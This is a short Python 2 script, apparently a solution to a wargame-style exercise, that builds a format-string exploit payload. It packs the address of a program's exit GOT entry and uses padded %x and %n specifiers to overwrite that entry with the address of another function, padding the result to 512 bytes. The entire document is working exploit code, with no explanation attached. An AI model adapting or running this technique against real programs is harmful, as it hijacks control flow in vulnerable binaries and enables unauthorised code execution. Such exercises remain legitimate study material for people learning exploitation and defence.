import struct

FT_O =			0x80484a4
EXIT_GOT=		0x8049838

def pad(s):
    return s+"X"*(512-len(s))

exploit=""
exploit+= struct.pack("I", EXIT_GOT)
exploit+= struct.pack("I", EXIT_GOT + 2)
exploit+="BBBBCCCC"

exploit+= "%4$33940x"
exploit+= "%4$n"

exploit+= "%33632x"
exploit+= "%5$n"
print pad(exploit)
